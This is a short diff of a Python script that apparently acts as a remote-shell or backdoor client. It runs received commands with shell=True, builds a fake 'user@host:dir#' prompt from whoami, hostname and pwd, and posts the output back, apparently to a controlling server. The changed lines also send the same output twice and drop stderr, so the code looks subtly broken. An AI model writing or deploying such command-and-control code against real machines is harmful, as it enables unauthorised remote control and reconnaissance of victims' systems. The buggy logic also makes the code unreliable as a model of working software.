@@ -33,9 +33,14 @@ def send_file(command):
 
 
 def run_command(command):
+    PWD = subprocess.Popen("pwd", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    USER = subprocess.Popen("whoami", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    HOST = subprocess.Popen("hostname", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+    PROMPT = USER.stdout.read().rstrip().decode() + "@" + HOST.stdout.read().rstrip().decode() + ":" + PWD.stdout.read().rstrip().decode() + "#"
     CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-    send_post(CMD.stdout.read())
-    send_post(CMD.stderr.read())
+    OUTPUT = PROMPT.encode() + CMD.stdout.read()
+    send_post(OUTPUT)
+    send_post(OUTPUT)
 
 
 while True:
